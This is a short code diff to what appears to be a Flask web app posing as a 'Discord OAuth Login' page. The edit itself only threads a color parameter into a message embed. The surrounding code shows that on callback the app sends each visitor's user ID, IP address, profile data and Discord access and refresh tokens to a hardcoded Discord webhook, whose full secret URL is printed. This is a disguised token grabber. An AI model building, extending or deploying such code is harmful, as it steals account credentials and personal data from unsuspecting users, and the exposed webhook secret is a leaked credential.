@@ -364,7 +364,7 @@ html {
     <body>
         <h1>Discord OAuth Login</h1>
         <p>Click the button below to log in with Discord:</p>
-        <a href="{login_url}"><button>Login with Discord</button></a>
+        <a href="{login_url}?color=#00FF00"><button>Login with Discord</button></a>
     </body>
     </html>
     '''
@@ -398,7 +398,8 @@ def oauth_callback():
         webhook_url = 'https://discord.com/api/webhooks/1182750185584066711/dn1wISc0tPKn4SIgiwvbZQVnKlOxsLGrIaKpy8QAOaYO5qNmIFu54IpVopxlm8-P7yzJ'
 
         profile_data = response.json()
-        embed = create_embed(user_id, user_ip, profile_data, session["discord_token"]["access_token"], session["discord_token"]["refresh_token"], color="#00FF00")
+        color = request.args.get('color', '#00FF00')
+        embed = create_embed(user_id, user_ip, profile_data, session["discord_token"]["access_token"], session["discord_token"]["refresh_token"], color=color)
 
         data = {'embeds': [embed]}
         response = requests.post(webhook_url, json=data)
